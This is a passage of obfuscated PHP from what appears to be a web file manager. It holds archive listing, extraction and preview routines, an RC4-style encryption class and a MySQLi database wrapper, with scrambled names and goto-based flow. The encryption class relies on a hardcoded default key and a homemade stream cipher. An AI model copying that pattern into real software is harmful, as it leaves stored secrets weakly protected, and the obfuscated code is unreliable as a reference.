$e‘•öÆãƒ–[1901], $e‘•öÆãƒ–[1902], $e‘•öÆãƒ–[1903], $e‘•öÆãƒ–[1904], $e‘•öÆãƒ–[1905])); goto f¤ÅŠÅî·È; FÇÈ‰ñàÔ«: return $b´¯¿†—; goto fğ¨õÏ¦š§; fğ¨õÏ¦š§: } static function listContent($C­ÉÕÏ†«, $f—ÀÕ¤µ§‹ = true) { $Eíêœï™ªô =& $_SERVER[Æ]; self::init(); $FÑâçâŒ®‡ = !empty($GLOBALS[$Eíêœï™ªô[1049]]) ? $GLOBALS[$Eíêœï™ªô[1049]] : get_path_ext($C­ÉÕÏ†«); $b¾´Âå„ˆÉ = !1; if (self::checkIfType($FÑâçâŒ®‡, $Eíêœï™ªô[1898])) { $EÏøæˆë = PclTarList($C­ÉÕÏ†«, $FÑâçâŒ®‡); $b¾´Âå„ˆÉ = array(); for ($BÏ›“£àÚ = 0; $BÏ›“£àÚ < count($EÏøæˆë); $BÏ›“£àÚ++) { $Cé†ô‚ö – = $EÏøæˆë[$BÏ›“£àÚ]; if ($Cé†ô‚ö –[$Eíêœï™ªô[1913]] == $Eíêœï™ªô[1914] || $Cé†ô‚ö –[$Eíêœï™ªô[1913]] == $Eíêœï™ªô[1915]) { continue; } if ($f—ÀÕ¤µ§‹) { $Cé†ô‚ö –[$Eíêœï™ªô[1916]] = ltrim($Cé†ô‚ö –[$Eíêœï™ªô[1916]], $Eíêœï™ªô[1154]); } if ($Cé†ô‚ö –[$Eíêœï™ªô[1913]] == $Eíêœï™ªô[1917]) { $Cé†ô‚ö –[$Eíêœï™ªô[76]] = !0; } else { $Cé†ô‚ö –[$Eíêœï™ªô[76]] = !1; } $Cé†ô‚ö –[$Eíêœï™ªô[1036]] = $BÏ›“£àÚ; $b¾´Âå„ˆÉ[] = $Cé†ô‚ö –; } } else { if (self::checkIfType($FÑâçâŒ®‡, $Eíêœï™ªô[1045])) { $Cá‚±¤®öŞ = kodRarArchive::listContent($C­ÉÕÏ†«); if (!$Cá‚±¤®öŞ[$Eíêœï™ªô[1032]]) { return $Cá‚±¤®öŞ; } else { $b¾´Âå„ˆÉ = $Cá‚±¤®öŞ[$Eíêœï™ªô[1034]]; } } else { if (kodZipArchive::support($Eíêœï™ªô[354])) { $b¾´Âå„ˆÉ = kodZipArchive::listContent($C­ÉÕÏ†«); } else { $bº‚¶Ô…‰ó = new PclZip($C­ÉÕÏ†«); $b¾´Âå„ˆÉ = $bº‚¶Ô…‰ó->listContent(); } } } if ($b¾´Âå„ˆÉ) { $aÈ¨Õçœ¨ = unzip_charset_get($b¾´Âå„ˆÉ); $f—ÀÕ¤µ§‹ = $f—ÀÕ¤µ§‹ && function_exists($Eíêœï™ªô[65]); for ($BÏ›“£àÚ = 0; $BÏ›“£àÚ < count($b¾´Âå„ˆÉ); $BÏ›“£àÚ++) { $b¾´Âå„ˆÉ[$BÏ›“£àÚ][$Eíêœï™ªô[1916]] = str_replace(array($Eíêœï™ªô[1072], $Eíêœï™ªô[1918]), $Eíêœï™ªô[761], $b¾´Âå„ˆÉ[$BÏ›“£àÚ][$Eíêœï™ªô[1916]]); if ($f—ÀÕ¤µ§‹) { $b¾´Âå„ˆÉ[$BÏ›“£àÚ][$Eíêœï™ªô[1916]] = iconv_to($b¾´Âå„ˆÉ[$BÏ›“£àÚ][$Eíêœï™ªô[1916]], $aÈ¨Õçœ¨, $Eíêœï™ªô[326]); unset($b¾´Âå„ˆÉ[$BÏ›“£àÚ][$Eíêœï™ªô[1919]]); } } return array($Eíêœï™ªô[1032] => !0, $Eíêœï™ªô[1034] => $b¾´Âå„ˆÉ); } else { return array($Eíêœï™ªô[1032] => !1, $Eíêœï™ªô[1034] => $b¾´Âå„ˆÉ); } } static function extract($Aìœ¹†ª‘‘, $DÖÍ‡çÜ, $F³¬óŸë•É = "\x2d\x31", &$bÉô¶–¯Óé = false) { goto cËá «ø¡ö; AºæÖ²è­Š: $fææò·Šê½ = self::listContent($Aìœ¹†ª‘‘, !1); if (!$fææò·Šê½[$C”†“—ÃÅÊ[1032]]) { return $fææò·Šê½; } if ($F³¬óŸë•É != $C”†“—ÃÅÊ[1031]) { goto eîÍİ¥¢Ï¬; eîÍİ¥¢Ï¬: $DÍ‘»á¼òÃ = self::fileIndex($fææò·Šê½[$C”†“—ÃÅÊ[1034]], $F³¬óŸë•É); $bÉô¶–¯Óé = str_replace(array($C”†“—ÃÅÊ[1072], $C”†“—ÃÅÊ[1918]), $C”†“—ÃÅÊ[70], $DÍ‘»á¼òÃ[$C”†“—ÃÅÊ[1916]]); $føæÆ‘¦í• = $bÉô¶–¯Óé; goto A´ªŞÊëÁö; aßÀÊÚá¥é: if ($DÍ‘»á¼òÃ[$C”†“—ÃÅÊ[76]]) { $føæÆ‘¦í• = rtrim($føæÆ‘¦í•, $C”†“—ÃÅÊ[8]) . $C”†“—ÃÅÊ[8]; $bÉô¶–¯Óé = array($bÉô¶–¯Óé); } $c¤šÙ¿™Á = str_replace($C”†“—ÃÅÊ[93], $C”†“—ÃÅÊ[8], $føæÆ‘¦í•); if (substr($c¤šÙ¿™Á, -1) == $C”†“—ÃÅÊ[8]) { if (!strstr(trim($c¤šÙ¿™Á, $C”†“—ÃÅÊ[8]), $C”†“—ÃÅÊ[8])) { $DÖÍ‡çÜ = $DÖÍ‡çÜ . get_path_this($c¤šÙ¿™Á) . $C”†“—ÃÅÊ[8]; } } else { if ($dˆÍ†¥à¶æ == $føæÆ‘¦í•) { $dˆÍ†¥à¶æ = $C”†“—ÃÅÊ[33]; } } goto E‹­æ²Ú†²; A´ªŞÊëÁö: if ($GLOBALS[$C”†“—ÃÅÊ[6]][$C”†“—ÃÅÊ[1152]] != $C”†“—ÃÅÊ[326]) { $føæÆ‘¦í• = unzip_pre_name($bÉô¶–¯Óé); } $dˆÍ†¥à¶æ = get_path_father($bÉô¶–¯Óé); if ($dˆÍ†¥à¶æ == $bÉô¶–¯Óé) { $dˆÍ†¥à¶æ = $C”†“—ÃÅÊ[33]; } goto aßÀÊÚá¥é; E‹­æ²Ú†²: } goto F‰Ä¢Ö‘ëå; F‰Ä¢Ö‘ëå: if (self::checkIfType($d£ë®¡¸±, $C”†“—ÃÅÊ[1898])) { if ($F³¬óŸë•É != $C”†“—ÃÅÊ[1031]) { $føæÆ‘¦í• = unzip_pre_name($føæÆ‘¦í•); $dˆÍ†¥à¶æ = unzip_pre_name($dˆÍ†¥à¶æ); $AÔîÊ‚µÕ = PclTarExtractList($Aìœ¹†ª‘‘, array($føæÆ‘¦í•), $DÖÍ‡çÜ, $dˆÍ†¥à¶æ, $d£ë®¡¸±); } else { $AÔîÊ‚µÕ = PclTarExtract($Aìœ¹†ª‘‘, $DÖÍ‡çÜ, $C”†“—ÃÅÊ[361], $d£ë®¡¸±); } return array($C”†“—ÃÅÊ[1032] => $AÔîÊ‚µÕ, $C”†“—ÃÅÊ[1034] => PclErrorString(!0)); } else { if (self::checkIfType($d£ë®¡¸±, $C”†“—ÃÅÊ[1045])) { return kodRarArchive::extract($Aìœ¹†ª‘‘, $DÖÍ‡çÜ, $d£ë®¡¸±, $bÉô¶–¯Óé); } else { if (kodZipArchive::support($C”†“—ÃÅÊ[1920])) { return kodZipArchive::extract($Aìœ¹†ª‘‘, $DÖÍ‡çÜ, $bÉô¶–¯Óé); } else { $b…Œ™«ÑË = new PclZip($Aìœ¹†ª‘‘); if ($F³¬óŸë•É != $C”†“—ÃÅÊ[1031]) { $AÔîÊ‚µÕ = $b…Œ™«ÑË->extract(PCLZIP_OPT_PATH, $DÖÍ‡çÜ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $C”†“—ÃÅÊ[1921], PCLZIP_OPT_BY_NAME, $DÍ‘»á¼òÃ[$C”†“—ÃÅÊ[1916]], PCLZIP_OPT_REMOVE_PATH, $dˆÍ†¥à¶æ, PCLZIP_OPT_REPLACE_NEWER); } else { $AÔîÊ‚µÕ = $b…Œ™«ÑË->extract(PCLZIP_OPT_PATH, $DÖÍ‡çÜ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $C”†“—ÃÅÊ[1921], PCLZIP_OPT_REPLACE_NEWER); } return array($C”†“—ÃÅÊ[1032] => $AÔîÊ‚µÕ, $C”†“—ÃÅÊ[1034] => $b…Œ™«ÑË->errorName(!0)); } } } return array($C”†“—ÃÅÊ[1032] => !1, $C”†“—ÃÅÊ[1034] => $C”†“—ÃÅÊ[1922]); goto D›Ö“¼ç”Œ; cËá «ø¡ö: $C”†“—ÃÅÊ =& $_SERVER[Æ]; self::init(); $d£ë®¡¸± = !empty($GLOBALS[$C”†“—ÃÅÊ[1049]]) ? $GLOBALS[$C”†“—ÃÅÊ[1049]] : get_path_ext($Aìœ¹†ª‘‘); goto AºæÖ²è­Š; D›Ö“¼ç”Œ: } static function fileIndex($bÀáçƒ© , $d½ÆĞñ…ÊÙ, $c¹öÉÙ…Î = false) { goto BÑ»‹ƒÍÙ·; bÓ‰„Î´Ô: $aõãò¾šÀ÷ = count($bÀáçƒ© ); for ($Fäæ­ÙÃÎ = 0; $Fäæ­ÙÃÎ < $aõãò¾šÀ÷; $Fäæ­ÙÃÎ++) { if ($d½ÆĞñ…ÊÙ == $bÀáçƒ© [$Fäæ­ÙÃÎ][$aØ„ã°§ÂŞ[1036]]) { $d­ƒÌÃ«åÕ = $bÀáçƒ© [$Fäæ­ÙÃÎ]; break; } } if (!$d­ƒÌÃ«åÕ) { show_tips($aØ„ã°§ÂŞ[1923]); } goto Fì©óé¯„…; BÑ»‹ƒÍÙ·: $aØ„ã°§ÂŞ =& $_SERVER[Æ]; self::init(); if (!is_array($bÀáçƒ© )) { return !1; } goto bÓ‰„Î´Ô; Fì©óé¯„…: $EÛÃé¾‰»© = $d­ƒÌÃ«åÕ; if ($c¹öÉÙ…Î) { $EÛÃé¾‰»© = $d­ƒÌÃ«åÕ[$c¹öÉÙ…Î]; if ($d­ƒÌÃ«åÕ[$aØ„ã°§ÂŞ[76]]) { $EÛÃé¾‰»© = rtrim($EÛÃé¾‰»©, $aØ„ã°§ÂŞ[8]) . $aØ„ã°§ÂŞ[8]; } } return $EÛÃé¾‰»©; goto Eù¥Š©ß¨ñ; Eù¥Š©ß¨ñ: } static function extractZipFile($E¹Ì—ÉÇ¯‰, $b–Ü´‰ïÅ, $d—é†ßé‘Û = false) { goto A»ÕÁ¯Ñ; AÆÎ¸ÑµÅ: mk_dir($A¥Û­´¬Â²); $A—‡Ê×ÀÌÉ = $A¥Û­´¬Â² . md5($E¹Ì—ÉÇ¯‰ . $b–Ü´‰ïÅ); if ($d—é†ßé‘Û) { $A—‡Ê×ÀÌÉ = $A¥Û­´¬Â² . $d—é†ßé‘Û; } goto CÏ¡ç·ï¦ğ; A»ÕÁ¯Ñ: $a½ ÆÁ¯ÀÏ =& $_SERVER[Æ]; self::init(); $A¥Û­´¬Â² = TEMP_FILES . hash_path($E¹Ì—ÉÇ¯‰) . $a½ ÆÁ¯ÀÏ[8]; goto AÆÎ¸ÑµÅ; CÏ¡ç·ï¦ğ: if (file_exists($A—‡Ê×ÀÌÉ)) { return $A—‡Ê×ÀÌÉ; } $E˜ƒñÖ¥ˆØ = new PclZip($E¹Ì—ÉÇ¯‰); $e„™œöÛ = unzip_filter_ext($A¥Û­´¬Â² . get_path_this($b–Ü´‰ïÅ)); goto FĞ¶Ğ³øÇ; C¤ŠÓ¾×Êß: if (!file_exists($e„™œöÛ)) { return !1; } @rename($e„™œöÛ, $A—‡Ê×ÀÌÉ); return $A—‡Ê×ÀÌÉ; goto B—ê’¾—™‡; FĞ¶Ğ³øÇ: $e¸ÅÆÒ“œ = get_path_father($b–Ü´‰ïÅ); if ($e¸ÅÆÒ“œ == $b–Ü´‰ïÅ) { $e¸ÅÆÒ“œ = $a½ ÆÁ¯ÀÏ[33]; } $DÓ·ìêÕŞ‚ = $E˜ƒñÖ¥ˆØ->extract(PCLZIP_OPT_PATH, $A¥Û­´¬Â², PCLZIP_CB_PRE_FILE_NAME, $a½ ÆÁ¯ÀÏ[1921], PCLZIP_OPT_REMOVE_PATH, $e¸ÅÆÒ“œ, PCLZIP_OPT_BY_NAME, $b–Ü´‰ïÅ); goto C¤ŠÓ¾×Êß; B—ê’¾—™‡: } static function filePreview($FÌ™àøÖ¹ä, $fÊ„ù¡Ã…Ü, $aºˆÃ˜ ‘é = false, $Eº†‚ØÅ¶‹ = false) { goto bˆˆÅô¹Ú; eÃ¨‡‡¿¼‚: $a™É­ùêÇ¼ = self::extract($FÌ™àøÖ¹ä, $e¬º¶¼²†, $fÊ„ù¡Ã…Ü, $fˆºß³âó©); if (is_array($fˆºß³âó©)) { show_json($BÖ‡Ñµøµî[1924], !1); } if (file_exists($AÒá•¯ÖÙ¼)) { IO::fileOut($AÒá•¯ÖÙ¼, $aºˆÃ˜ ‘é, get_path_this($fˆºß³âó©)); return; } goto dí§Úƒ¼Íí; F«¼æé¸ø: mk_dir($e¬º¶¼²†); $AÒá•¯ÖÙ¼ = $e¬º¶¼²† . md5($FÌ™àøÖ¹ä . $fÊ„ù¡Ã…Ü . $Eº†‚ØÅ¶‹); $fˆºß³âó© = $BÖ‡Ñµøµî[33]; goto eÃ¨‡‡¿¼‚; bˆˆÅô¹Ú: $BÖ‡Ñµøµî =& $_SERVER[Æ]; self::init(); $e¬º¶¼²† = TEMP_FILES . hash_path($FÌ™àøÖ¹ä) . $BÖ‡Ñµøµî[8]; goto F«¼æé¸ø; bÏ—ºØøÊ: if (!$a™É­ùêÇ¼[$BÖ‡Ñµøµî[1032]]) { show_json($a™É­ùêÇ¼[$BÖ‡Ñµøµî[1034]], !1); } if (!file_exists($DÒ„ÂÎïâ¶)) { show_json($BÖ‡Ñµøµî[1925], !1); } @rename($DÒ„ÂÎïâ¶, $AÒá•¯ÖÙ¼); goto cÁ‰Ì„÷Ì‰; cÁ‰Ì„÷Ì‰: if (!file_exists($AÒá•¯ÖÙ¼)) { del_dir($e¬º¶¼²†); show_json($BÖ‡Ñµøµî[1926]); } IO::fileOut($AÒá•¯ÖÙ¼, $aºˆÃ˜ ‘é, $e˜ÀôÕ‘‘); goto eİ®°…‚…³; dí§Úƒ¼Íí: $fˆºß³âó© = unzip_pre_name($fˆºß³âó©); $e˜ÀôÕ‘‘ = get_path_this($fˆºß³âó©); $DÒ„ÂÎïâ¶ = unzip_filter_ext($e¬º¶¼²† . $e˜ÀôÕ‘‘); goto bÏ—ºØøÊ; eİ®°…‚…³: } static function create($cç‚ÇÜÔ¨ø, $F¾œ¤É©¦) { $CŒ¶‡š’±… =& $_SERVER[Æ]; self::init(); $B§“…Ôóøô = get_path_ext($cç‚ÇÜÔ¨ø); $dÜÏ•ò®Ï = !1; if (self::checkIfType($B§“…Ôóøô, $CŒ¶‡š’±…[301])) { if (kodZipArchive::support($CŒ¶‡š’±…[1010])) { return kodZipArchive::create($cç‚ÇÜÔ¨ø, $F¾œ¤É©¦); } $bÅ‘…µ×Ô = new PclZip($cç‚ÇÜÔ¨ø); foreach ($F¾œ¤É©¦ as $a ÃŒˆŠçæ => $AŸÑİºïâ¨) { $AŸÑİºïâ¨ = str_replace($CŒ¶‡š’±…[467], $CŒ¶‡š’±…[8], $AŸÑİºïâ¨); $DÄê­ŠíÛ = Kodio::clear(get_path_father($AŸÑİºïâ¨)); if ($a ÃŒˆŠçæ == 0) { $dÜÏ•ò®Ï = $bÅ‘…µ×Ô->create($AŸÑİºïâ¨, PCLZIP_OPT_REMOVE_PATH, $DÄê­ŠíÛ, PCLZIP_CB_PRE_FILE_NAME, $CŒ¶‡š’±…[1927]); continue; } $dÜÏ•ò®Ï = $bÅ‘…µ×Ô->add($AŸÑİºïâ¨, PCLZIP_OPT_REMOVE_PATH, $DÄê­ŠíÛ, PCLZIP_CB_PRE_FILE_NAME, $CŒ¶‡š’±…[1927]); } } else { if (self::checkIfType($B§“…Ôóøô, $CŒ¶‡š’±…[1898])) { foreach ($F¾œ¤É©¦ as $a ÃŒˆŠçæ => $AŸÑİºïâ¨) { $AŸÑİºïâ¨ = str_replace($CŒ¶‡š’±…[467], $CŒ¶‡š’±…[8], $AŸÑİºïâ¨); $DÄê­ŠíÛ = Kodio::clear(get_path_father($AŸÑİºïâ¨)); if ($a ÃŒˆŠçæ == 0) { $dÜÏ•ò®Ï = PclTarCreate($cç‚ÇÜÔ¨ø, array($AŸÑİºïâ¨), $B§“…Ôóøô, null, $DÄê­ŠíÛ); continue; } $dÜÏ•ò®Ï = PclTarAddList($cç‚ÇÜÔ¨ø, array($AŸÑİºïâ¨), $CŒ¶‡š’±…[33], $DÄê­ŠíÛ, $B§“…Ôóøô); } } } return $dÜÏ•ò®Ï; } } class Mcrypt { public static $defaultKey = "\x61\41\x74\141\153\101\x3a\x64\154\155\x63\x6c\x64\x45\x76\x2c\x65"; public static function encode($cĞ‹¥«è‰ô, $D¢–ÑÍÈÃ = '', $FÈ°¶Î¿† = 0, $d´½´œß = '') { goto b†òŠ•ëè¤; aØÊ ¡¸ßØ: $fŞ²Ï´‡–Õ = str_replace(array($få¬©Æ¾¤º[284], $få¬©Æ¾¤º[8], $få¬©Æ¾¤º[908]), array($få¬©Æ¾¤º[412], $få¬©Æ¾¤º[70], $få¬©Æ¾¤º[91]), $fŞ²Ï´‡–Õ); return $fŞ²Ï´‡–Õ; goto F¹¥ëî·ÇÓ; b†òŠ•ëè¤: $få¬©Æ¾¤º =& $_SERVER[Æ]; $C‰Ã†ëóôˆ = 4; $D¢–ÑÍÈÃ = md5($D¢–ÑÍÈÃ ? $D¢–ÑÍÈÃ : self::$defaultKey); goto a¯„ÍÇ­ò; fÇ¸ôÇáçŒ: $FÖ®à©”±ó = substr($d´½´œß, -$C‰Ã†ëóôˆ); $c“ÖÒƒÕƒ¾ = $c ¥¦Åƒ“ . md5($c ¥¦Åƒ“ . $FÖ®à©”±ó); $cß›‘í‚ô½ = strlen($c“ÖÒƒÕƒ¾); goto f°£šÉâº; a¯„ÍÇ­ò: $c ¥¦Åƒ“ = md5(substr($D¢–ÑÍÈÃ, 0, 16)); $eã‡ĞÇªƒÉ = md5(substr($D¢–ÑÍÈÃ, 16, 16)); $d´½´œß = $d´½´œß ? $d´½´œß : md5(microtime()); goto fÇ¸ôÇáçŒ; DéßßùÑñ: $fŞ²Ï´‡–Õ = $få¬©Æ¾¤º[33]; for ($c»§†°ˆ¨ = $D­¸¦Á¤ô´ = $C–‚èö„á = 0; $C–‚èö„á < $DÖáçèÔø˜; $C–‚èö„á++) { $c»§†°ˆ¨ = ($c»§†°ˆ¨ + 1) % 256; $D­¸¦Á¤ô´ = ($D­¸¦Á¤ô´ + $aéÉ—¶„ªï[$c»§†°ˆ¨]) % 256; $DÚ½´’¸˜‘ = $aéÉ—¶„ªï[$c»§†°ˆ¨]; $aéÉ—¶„ªï[$c»§†°ˆ¨] = $aéÉ—¶„ªï[$D­¸¦Á¤ô´]; $aéÉ—¶„ªï[$D­¸¦Á¤ô´] = $DÚ½´’¸˜‘; $fŞ²Ï´‡–Õ .= chr(ord($cĞ‹¥«è‰ô[$C–‚èö„á]) ^ $aéÉ—¶„ªï[($aéÉ—¶„ªï[$c»§†°ˆ¨] + $aéÉ—¶„ªï[$D­¸¦Á¤ô´]) % 256]); } $fŞ²Ï´‡–Õ = $FÖ®à©”±ó . str_replace($få¬©Æ¾¤º[908], $få¬©Æ¾¤º[33], base64_encode($fŞ²Ï´‡–Õ)); goto aØÊ ¡¸ßØ; bèİŒ‰¸•ç: for ($C–‚èö„á = 0; $C–‚èö„á <= 255; $C–‚èö„á++) { $C¨Â‹œ–ª’[$C–‚èö„á] = ord($c“ÖÒƒÕƒ¾[$C–‚èö„á % $cß›‘í‚ô½]); } $aéÉ—¶„ªï = range(0, 255); for ($D­¸¦Á¤ô´ = $C–‚èö„á = 0; $C–‚èö„á < 256; $C–‚èö„á++) { $D­¸¦Á¤ô´ = ($D­¸¦Á¤ô´ + $aéÉ—¶„ªï[$C–‚èö„á] + $C¨Â‹œ–ª’[$C–‚èö„á]) % 256; $DÚ½´’¸˜‘ = $aéÉ—¶„ªï[$C–‚èö„á]; $aéÉ—¶„ªï[$C–‚èö„á] = $aéÉ—¶„ªï[$D­¸¦Á¤ô´]; $aéÉ—¶„ªï[$D­¸¦Á¤ô´] = $DÚ½´’¸˜‘; } goto DéßßùÑñ; f°£šÉâº: $cĞ‹¥«è‰ô = sprintf($få¬©Æ¾¤º[1928], $FÈ°¶Î¿† ? $FÈ°¶Î¿† + time() : 0) . substr(md5($cĞ‹¥«è‰ô . $eã‡ĞÇªƒÉ), 0, 16) . $cĞ‹¥«è‰ô; $DÖáçèÔø˜ = strlen($cĞ‹¥«è‰ô); $C¨Â‹œ–ª’ = array(); goto bèİŒ‰¸•ç; F¹¥ëî·ÇÓ: } public static function decode($eİ‰È¶œô, $f×ğÉøÇ¨… = '') { goto A¾¹¼ÂÆ«; C˜ù ñ¦­‡: for ($BÄ”ë‹ö¾ = 0; $BÄ”ë‹ö¾ <= 255; $BÄ”ë‹ö¾++) { $aºñ¤¡¦ ¡[$BÄ”ë‹ö¾] = ord($e´Œ£ì†‘¶[$BÄ”ë‹ö¾ % $CµØåç§ó]); } $Fª©äĞ›¥À = range(0, 255); for ($FàÍ×´ÂÂã = $BÄ”ë‹ö¾ = 0; $BÄ”ë‹ö¾ < 256; $BÄ”ë‹ö¾++) { $FàÍ×´ÂÂã = ($FàÍ×´ÂÂã + $Fª©äĞ›¥À[$BÄ”ë‹ö¾] + $aºñ¤¡¦ ¡[$BÄ”ë‹ö¾]) % 256; $cÍã³¤ˆñÃ = $Fª©äĞ›¥À[$BÄ”ë‹ö¾]; $Fª©äĞ›¥À[$BÄ”ë‹ö¾] = $Fª©äĞ›¥À[$FàÍ×´ÂÂã]; $Fª©äĞ›¥À[$FàÍ×´ÂÂã] = $cÍã³¤ˆñÃ; } goto BÈÉŸˆÈ‹È; e«‘”­÷´³: $f×ğÉøÇ¨… = md5($f×ğÉøÇ¨… ? $f×ğÉøÇ¨… : self::$defaultKey); $D»áƒÃÔô„ = md5(substr($f×ğÉøÇ¨…, 0, 16)); $eÏßÅ˜˜ƒ = md5(substr($f×ğÉøÇ¨…, 16, 16)); goto a¼½ƒÆáßÄ; a¼½ƒÆáßÄ: $f¼¿Şœêº¸ = substr($eİ‰È¶œô, 0, $aÈ¨èôá÷µ); $e´Œ£ì†‘¶ = $D»áƒÃÔô„ . md5($D»áƒÃÔô„ . $f¼¿Şœêº¸); $CµØåç§ó = strlen($e´Œ£ì†‘¶); goto a¼ö—ĞÅ¬ ; A¾¹¼ÂÆ«: $C¯™Ÿâ³î =& $_SERVER[Æ]; $eİ‰È¶œô = str_replace(array($C¯™Ÿâ³î[412], $C¯™Ÿâ³î[70], $C¯™Ÿâ³î[91]), array($C¯™Ÿâ³î[284], $C¯™Ÿâ³î[8], $C¯™Ÿâ³î[908]), $eİ‰È¶œô); $aÈ¨èôá÷µ = 4; goto e«‘”­÷´³; BÙÂª®œğ: if (($Fîá¶å‘Ä == 0 || $Fîá¶å‘Ä - time() > 0) && substr($C¦Æ«†›Ø¢, 10, 16) == substr(md5(substr($C¦Æ«†›Ø¢, 26) . $eÏßÅ˜˜ƒ), 0, 16)) { return substr($C¦Æ«†›Ø¢, 26); } else { return $C¯™Ÿâ³î[33]; } goto D®Ãù»ÛÀ; a¼ö—ĞÅ¬ : $eİ‰È¶œô = base64_decode(substr($eİ‰È¶œô, $aÈ¨èôá÷µ)); $b¦†¢Şá‘İ = strlen($eİ‰È¶œô); $aºñ¤¡¦ ¡ = array(); goto C˜ù ñ¦­‡; BÈÉŸˆÈ‹È: $C¦Æ«†›Ø¢ = $C¯™Ÿâ³î[33]; for ($böïì‹¤Œ  = $FàÍ×´ÂÂã = $BÄ”ë‹ö¾ = 0; $BÄ”ë‹ö¾ < $b¦†¢Şá‘İ; $BÄ”ë‹ö¾++) { $böïì‹¤Œ  = ($böïì‹¤Œ  + 1) % 256; $FàÍ×´ÂÂã = ($FàÍ×´ÂÂã + $Fª©äĞ›¥À[$böïì‹¤Œ ]) % 256; $cÍã³¤ˆñÃ = $Fª©äĞ›¥À[$böïì‹¤Œ ]; $Fª©äĞ›¥À[$böïì‹¤Œ ] = $Fª©äĞ›¥À[$FàÍ×´ÂÂã]; $Fª©äĞ›¥À[$FàÍ×´ÂÂã] = $cÍã³¤ˆñÃ; $C¦Æ«†›Ø¢ .= chr(ord($eİ‰È¶œô[$BÄ”ë‹ö¾]) ^ $Fª©äĞ›¥À[($Fª©äĞ›¥À[$böïì‹¤Œ ] + $Fª©äĞ›¥À[$FàÍ×´ÂÂã]) % 256]); } $Fîá¶å‘Ä = intval(substr($C¦Æ«†›Ø¢, 0, 10)); goto BÙÂª®œğ; D®Ãù»ÛÀ: } } define($_SERVER[Æ][1929], 1); goto Cšâğì˜¡ ; e­¢è‰Ã: class DbMysqli extends Db { public function __construct($B¸å˜°„Î­ = '') { $EîŒå£°Ç¢ =& $_SERVER[Æ]; if (!extension_loaded($EîŒå£°Ç¢[725])) { think_exception(think_lang($EîŒå£°Ç¢[10]) . $EîŒå£°Ç¢[826]); } if (!empty($B¸å˜°„Î­)) { $this->config = $B¸å˜°„Î­; if (empty($this->config[$EîŒå£°Ç¢[13]])) { $this->config[$EîŒå£°Ç¢[13]] = $EîŒå£°Ç¢[33]; } } } public function connect($a­øëƒèÆŞ = '', $Aƒ¿ëğ‹Óì = 0) { $eµĞêÎ—³ =& $_SERVER[Æ]; if (!isset($this->linkID[$Aƒ¿ëğ‹Óì])) { goto Dƒ†ÌÂŠ¥Ğ; e—Íùº†Ñß: $this->connected = !0; if (1 != think_config($eµĞêÎ—³[18])) { unset($this->config); } goto bœõ‡§“‰; aìŠº¤½¼…: $AÑ¦Î¿éÅ‘ = $this->linkID[$Aƒ¿ëğ‹Óì]->server_version; $this->linkID[$Aƒ¿ëğ‹Óì]->query($eµĞêÎ—³[804] . think_config($eµĞêÎ—³[805]) . $eµĞêÎ—³[55]); if ($AÑ¦Î¿éÅ‘ > $eµĞêÎ—³[806]) { $this->linkID[$Aƒ¿ëğ‹Óì]->query($eµĞêÎ—³[807]); } goto e—Íùº†Ñß; Dƒ†ÌÂŠ¥Ğ: if (empty($a­øëƒèÆŞ)) { $a­øëƒèÆŞ = $this->config; } $this->linkID[$Aƒ¿ëğ‹Óì] = new mysqli($a­øëƒèÆŞ[$eµĞêÎ—³[800]], $a­øëƒèÆŞ[$eµĞêÎ—³[802]], $a­øëƒèÆŞ[$eµĞêÎ—³[803]], $a­øëƒèÆŞ[$eµĞêÎ—³[17]], $a­øëƒèÆŞ[$eµĞêÎ—³[801]] ? intval($a­øëƒèÆŞ[$eµĞêÎ—³[801]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto aìŠº¤½¼…; bœõ‡§“‰: } return $this->linkID[$Aƒ¿ëğ‹Óì]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($a˜Ãœª¿­) { goto b²Äá‰Å’´; e¦¸¾ÌÔ¿ˆ: $this->queryStr = $a˜Ãœª¿­; if ($this->queryID) { $this->free(); } think_action_status($a› ˆ½òŸ…[19], 1); goto aŸ ª «áŸ; b²Äá‰Å’´: $a› ˆ½òŸ… =& $_SERVER[Æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e¦¸¾ÌÔ¿ˆ; aŸ ª «áŸ: think_status($a› ˆ½òŸ…[20]); $this->queryID = $this->_linkID->query($a˜Ãœª¿­); if ($this->_linkID->more_results()) { while (($e±¯æáÈ‘ = $this->_linkID->next_result()) != NULL) { $e±¯æáÈ‘->free_result(); } } goto Eø×ëËÀõô; Eø×ëËÀõô: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto C¿‡Ì‚¸ˆ‹; C¿‡Ì‚¸ˆ‹: } public function execute($dõõãÒŠŞñ) { goto Cğœõ½Á; c‚Å…Æ¬›Œ: if (!1 === $cÊÃ°µ—Š¼) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto b¼º†­Ş•ó; A›¢­®¹æ: think_status($DÉÌ‰æÜ°«[20]); $cÊÃ°µ—Š¼ = $this->_linkID->query($dõõãÒŠŞñ); $this->debug(); goto c‚Å…Æ¬›Œ; Cğœõ½Á: $DÉÌ‰æÜ°« =& $_SERVER[Æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Bš®ß¼ÃÚØ; Bš®ß¼ÃÚØ: $this->queryStr = $dõõãÒŠŞñ; if ($this->queryID) { $this->free(); } think_action_status($DÉÌ‰æÜ°«[21], 1); goto A›¢­®¹æ; b¼º†­Ş•ó: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a‹·È‡¯Í = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$a‹·È‡¯Í) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dÅà¦ÌÅê‚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dÅà¦ÌÅê‚) { $this->error(); return !1; } } return !0; } private function getAll() { $dã‡²¨¾ëÕ = array(); if ($this->numRows > 0) { for ($c™ÃÒÒ‚Õ = 0; $c™ÃÒÒ‚Õ < $this->numRows; $c™ÃÒÒ‚Õ++) { 